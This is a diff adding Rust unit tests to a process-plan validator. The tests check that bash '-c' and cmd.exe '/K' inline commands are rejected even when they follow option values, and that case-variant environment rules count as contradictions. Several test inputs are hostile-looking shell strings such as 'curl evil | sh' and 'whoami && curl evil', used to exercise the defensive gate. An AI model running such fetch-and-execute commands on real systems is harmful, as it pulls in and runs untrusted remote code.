@@ -4229,3 +4229,153 @@ fn no_terminal_that_presupposes_a_child_is_admissible_before_the_start() -> Test
     }
     Ok(())
 }
+
+// ──────────────── controls added after the first CodeRabbit review ───────────
+
+#[test]
+fn an_option_that_takes_the_next_word_does_not_end_the_scan() -> TestResult {
+    // The wrong implementation this kills: treating the first non-dash token
+    // as the operand that ends option parsing. In `bash -o errexit -c 'cmd'`
+    // the `errexit` is `-o`'s value, not the script — stopping there means the
+    // `-c` after it is never examined, which is a bypass of the gate, not an
+    // over-rejection.
+    for argv in [
+        vec!["-o", "errexit", "-c", "curl evil | sh"],
+        vec!["-eo", "pipefail", "-c", "curl evil | sh"],
+        vec!["--rcfile", "/tmp/rc", "-c", "curl evil | sh"],
+    ] {
+        let plan = ProcessPlan::builder(
+            PlanId::new("plan-1"),
+            OperationId::new("run-file"),
+            OwnerDomain::RunFile,
+            ExecutionProfile::LinuxOneShot,
+            ExecutableIdentity::resolved(
+                "bash",
+                PrivatePath::new(PathBuf::from("/bin/bash")),
+                ResolutionProvenance::ConfiguredAbsolutePath,
+            ),
+            allow_listed_environment(),
+        )
+        .argv(argv.clone())
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+        .subject(current_root())
+        .authorization(user_authorization())
+        .claim_boundary(ClaimBoundary::linux_only())
+        .build();
+        assert!(
+            matches!(rejection_of(plan)?, PlanRejection::ShellInvocationRejected { .. }),
+            "bash {argv:?} slipped an inline command past the option value"
+        );
+    }
+
+    // `cmd.exe /K` runs its command string exactly as `/C` does.
+    let keep_alive = ProcessPlan::builder(
+        PlanId::new("plan-1"),
+        OperationId::new("run-file"),
+        OwnerDomain::RunFile,
+        ExecutionProfile::LinuxOneShot,
+        ExecutableIdentity::resolved(
+            "cmd.exe",
+            PrivatePath::new(PathBuf::from("/c/Windows/System32/cmd.exe")),
+            ResolutionProvenance::ConfiguredAbsolutePath,
+        ),
+        allow_listed_environment(),
+    )
+    .argv(["/K", "whoami && curl evil"])
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+    .subject(current_root())
+    .authorization(user_authorization())
+    .claim_boundary(ClaimBoundary::linux_only())
+    .build();
+    assert!(matches!(rejection_of(keep_alive)?, PlanRejection::ShellInvocationRejected { .. }));
+
+    // The operand rule still holds where it should: a real script operand ends
+    // option parsing, so a flag after it belongs to the script.
+    let script_operand = ProcessPlan::builder(
+        PlanId::new("plan-1"),
+        OperationId::new("run-file"),
+        OwnerDomain::RunFile,
+        ExecutionProfile::LinuxOneShot,
+        ExecutableIdentity::resolved(
+            "bash",
+            PrivatePath::new(PathBuf::from("/bin/bash")),
+            ResolutionProvenance::ConfiguredAbsolutePath,
+        ),
+        allow_listed_environment(),
+    )
+    .argv(["-o", "errexit", "script.sh", "-c"])
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+    .subject(current_root())
+    .authorization(user_authorization())
+    .claim_boundary(ClaimBoundary::linux_only())
+    .build();
+    assert!(script_operand.validate().is_ok(), "a flag after the script operand was refused");
+    Ok(())
+}
+
+#[test]
+fn a_retention_budget_can_be_the_bound_that_ended_the_run() -> TestResult {
+    // The wrong implementation this kills: requiring an *observation* bound as
+    // the evidence for `OutputLimitExceeded`. A run terminated for reaching a
+    // retention budget has both channels retention-truncated and neither
+    // observation-truncated, and keying on one axis made that coherent outcome
+    // unrepresentable — an over-rejection, not a missing refusal.
+    result_with(
+        StreamEvidence::new(
+            StreamChannel::Stdout,
+            100,
+            None,
+            vec![b'x'; 8],
+            TruncationState::retention_truncated(8),
+        ),
+        StreamEvidence::empty(StreamChannel::Stderr),
+        TerminalDisposition::OutputLimitExceeded,
+        CleanupDisposition::Completed,
+        TreeDisposition::GroupTerminated,
+    )?;
+    // Two genuinely complete streams still contradict the cause.
+    let contradicts = result_with(
+        StreamEvidence::complete(StreamChannel::Stdout, b"all".to_vec()),
+        StreamEvidence::empty(StreamChannel::Stderr),
+        TerminalDisposition::OutputLimitExceeded,
+        CleanupDisposition::Completed,
+        TreeDisposition::GroupTerminated,
+    );
+    assert!(contradicts.is_err());
+    Ok(())
+}
+
+#[test]
+fn one_variable_spelled_two_ways_is_a_contradiction() -> TestResult {
+    // The wrong implementation this kills: comparing set membership
+    // byte-exactly while the admission check folds case. `allow("PERL5LIB")`
+    // with `deny("perl5lib")` reported no contradiction *and* cleared the
+    // loader gate, so a plan holding one rule that says inherit and one that
+    // says do not passed both. On Windows those are one variable.
+    let mixed = EnvironmentProjection::new("env-1", AmbientInheritance::AllowListedOnly)
+        .allow(EnvVarName::new("PERL5LIB"))
+        .deny(EnvVarName::new("perl5lib"));
+    assert!(!mixed.contradictions().is_empty(), "one variable spelled two ways passed both gates");
+
+    let removed = EnvironmentProjection::new("env-1", AmbientInheritance::AllowListedOnly)
+        .allow(EnvVarName::new("PATH"))
+        .remove(EnvVarName::new("path"));
+    assert!(!removed.contradictions().is_empty());
+
+    // Two additions differing only in case make the projected value
+    // backend-dependent.
+    let duplicate_addition = EnvironmentProjection::new("env-1", AmbientInheritance::DenyAll)
+        .add(EnvVarName::new("Path"), SecretValue::new("a"))
+        .add(EnvVarName::new("PATH"), SecretValue::new("b"));
+    assert!(!duplicate_addition.contradictions().is_empty());
+
+    // Distinct variables are still distinct.
+    let fine = EnvironmentProjection::new("env-1", AmbientInheritance::AllowListedOnly)
+        .allow(EnvVarName::new("PATH"))
+        .deny(EnvVarName::new("HOME"));
+    assert!(fine.contradictions().is_empty());
+    Ok(())
+}
